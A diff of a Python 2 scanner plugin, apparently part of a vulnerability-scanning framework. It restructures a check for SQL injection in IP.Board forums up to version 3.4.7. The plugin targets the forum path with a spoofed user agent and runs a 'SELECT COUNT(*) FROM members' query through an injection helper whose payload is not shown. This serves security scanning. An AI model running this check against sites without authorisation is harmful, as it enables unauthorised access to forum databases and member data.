@@ -43,21 +43,19 @@ def inject(sql,url,ua):
 		# sys.exit('Error [1]') 
 	# sys.exit('Error [2]') 
 
-def Audit(services):
-	retinfo = None
-	output = ''
+def Assign(services):
 	if services.has_key('url') and services.has_key('cms'):
 		if services['cms'] == 'IP.Board':
 			if (services.has_key('cmsversion') and services['cmsversion']<='3.4.7') or services.has_key('cmsversion')==False:
-				# print 'yes'
-				url = services['url'] + '/forum/'
-				ua = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36" 
-				n = inject('SELECT COUNT(*) FROM members',url,ua) 
-				if n:
-					retinfo = {'level':'high','content':n}
-					output += 'Vula:\t' + url
-					security_note(n)
-	return (retinfo,output)
+				return True
+	return False
+
+def Audit(services):
+	url = services['url'] + '/forum/'
+	ua = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36" 
+	n = inject('SELECT COUNT(*) FROM members',url,ua) 
+	if n:
+		security_note(n)
 # ----------------------------------------------------------------------------------------------------
 #
 # ----------------------------------------------------------------------------------------------------
